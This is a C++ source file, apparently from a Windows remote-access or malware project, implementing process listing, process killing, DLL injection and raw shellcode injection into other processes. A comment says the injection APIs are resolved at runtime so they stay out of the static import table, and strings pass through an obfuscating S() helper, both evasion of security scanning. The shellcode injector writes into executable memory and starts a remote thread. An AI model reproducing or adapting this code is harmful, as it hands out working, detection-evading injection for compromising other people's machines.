/*
MIT License

Copyright (c) 2020 4B4DB4B3

Permission is hereby granted, free of charge, to any person obtaining a copy
of this software and associated documentation files (the "Software"), to deal
in the Software without restriction, including without limitation the rights
to use, copy, modify, merge, publish, distribute, sublicense, and/or sell
copies of the Software, and to permit persons to whom the Software is
furnished to do so, subject to the following conditions:

The above copyright notice and this permission notice shall be included in all
copies or substantial portions of the Software.

THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE
AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,
OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE
SOFTWARE.
*/

#include "ProcessManager.h"

// Inject APIs resolved at runtime — VirtualAllocEx / WriteProcessMemory / CreateRemoteThread
// do NOT appear in the static import table.
static inline LPVOID dyn_VirtualAllocEx(HANDLE h, LPVOID a, SIZE_T s, DWORD t, DWORD p) {
    using fn_t = LPVOID(WINAPI*)(HANDLE,LPVOID,SIZE_T,DWORD,DWORD);
    static fn_t fn = (fn_t)GetProcAddress(
        GetModuleHandleA(S("kernel32.dll").c_str()), S("VirtualAllocEx").c_str());
    return fn ? fn(h,a,s,t,p) : nullptr;
}
static inline BOOL dyn_WriteProcessMemory(HANDLE h, LPVOID b, LPCVOID d, SIZE_T s, SIZE_T* w) {
    using fn_t = BOOL(WINAPI*)(HANDLE,LPVOID,LPCVOID,SIZE_T,SIZE_T*);
    static fn_t fn = (fn_t)GetProcAddress(
        GetModuleHandleA(S("kernel32.dll").c_str()), S("WriteProcessMemory").c_str());
    return fn ? fn(h,b,d,s,w) : FALSE;
}
static inline HANDLE dyn_CreateRemoteThread(HANDLE h, LPSECURITY_ATTRIBUTES a, SIZE_T s,
                                             LPTHREAD_START_ROUTINE f, LPVOID p, DWORD fl, LPDWORD id) {
    using fn_t = HANDLE(WINAPI*)(HANDLE,LPSECURITY_ATTRIBUTES,SIZE_T,LPTHREAD_START_ROUTINE,LPVOID,DWORD,LPDWORD);
    static fn_t fn = (fn_t)GetProcAddress(
        GetModuleHandleA(S("kernel32.dll").c_str()), S("CreateRemoteThread").c_str());
    return fn ? fn(h,a,s,f,p,fl,id) : nullptr;
}
static inline BOOL dyn_VirtualFreeEx(HANDLE h, LPVOID a, SIZE_T s, DWORD t) {
    using fn_t = BOOL(WINAPI*)(HANDLE,LPVOID,SIZE_T,DWORD);
    static fn_t fn = (fn_t)GetProcAddress(
        GetModuleHandleA(S("kernel32.dll").c_str()), S("VirtualFreeEx").c_str());
    return fn ? fn(h,a,s,t) : FALSE;
}

std::string ProcessManager::ProcessList() {
	std::string list = "";
	HANDLE hSnap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
	if (hSnap != NULL) {
		PROCESSENTRY32 pe32;
		pe32.dwSize = sizeof(PROCESSENTRY32);

		if (Process32First(hSnap, &pe32)) {
			do {
				list.append(pe32.szExeFile);
				list.append("%0A");
			} while (Process32Next(hSnap, &pe32));
		}
	}
	return list;
}

bool ProcessManager::CloseProcess(std::string procname) {
	HANDLE hSnap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
	if (hSnap != NULL) {
		PROCESSENTRY32 pe32;
		pe32.dwSize = sizeof(PROCESSENTRY32);
		if (Process32First(hSnap, &pe32)) {
			do {
				if (strcmp(pe32.szExeFile, procname.c_str()) == 0) {
					HANDLE hProc = OpenProcess(PROCESS_ALL_ACCESS, FALSE, pe32.th32ProcessID);
					if (hProc != NULL) {
						TerminateProcess(hProc, 0);
						CloseHandle(hProc);
						return true;
					}
					else {
						return false;
					}
				}
			} while (Process32Next(hSnap, &pe32));
		}
	}
	return false;
}

bool ProcessManager::InjectDLL(const char* procname, const char* dllname) {
	DWORD PID = ProcessManager::PIDByName(procname);
	if (PID == 0)
		return false;

	HANDLE h_process = OpenProcess(PROCESS_ALL_ACCESS, FALSE, PID);

	LPVOID DllAddr = dyn_VirtualAllocEx(h_process, NULL, _MAX_PATH, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
	if (DllAddr == NULL)
		return 0;

	if (!(dyn_WriteProcessMemory(h_process, DllAddr, dllname, strlen(dllname), NULL)))
		return false;

	LPVOID LoadLibA = (LPVOID)GetProcAddress(
		GetModuleHandleA(S("kernel32.dll").c_str()), S("LoadLibraryA").c_str());
	if (LoadLibA == NULL)
		return false;

	HANDLE hThread = dyn_CreateRemoteThread(h_process, NULL, 0,
		(LPTHREAD_START_ROUTINE)LoadLibA, DllAddr, 0, NULL);
	if (hThread == NULL)
		return false;

	WaitForSingleObject(hThread, INFINITE);

	DWORD exit_code;
	GetExitCodeThread(hThread, &exit_code);

	CloseHandle(hThread);
	dyn_VirtualFreeEx(h_process, DllAddr, 0, MEM_RELEASE);
	CloseHandle(h_process);                                                    

	return true;
}

bool ProcessManager::InjectShell(DWORD pid, std::string shell) {
	bool result = false;
	HANDLE hProc = OpenProcess(PROCESS_ALL_ACCESS, FALSE, pid);
	
	PVOID addr = dyn_VirtualAllocEx(hProc, 0, shell.size(), MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);

	if (dyn_WriteProcessMemory(hProc, addr, shell.c_str(), shell.size(), 0)) {
		if (dyn_CreateRemoteThread(hProc, 0, 0, (LPTHREAD_START_ROUTINE)addr, 0, 0, 0) != 0) {
			result = true;
		}
	}

	CloseHandle(hProc);
	return result;
}

DWORD ProcessManager::PIDByName(std::string name) {
	HANDLE hSnap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
	if (hSnap != NULL) {
		PROCESSENTRY32 pe32;
		pe32.dwSize = sizeof(PROCESSENTRY32);

		if (Process32First(hSnap, &pe32)) {
			do {
				if (strcmp(pe32.szExeFile, name.c_str()) == 0) {
					return pe32.th32ProcessID;
				}
			} while (Process32Next(hSnap, &pe32));
		}
	}
	return 0;
}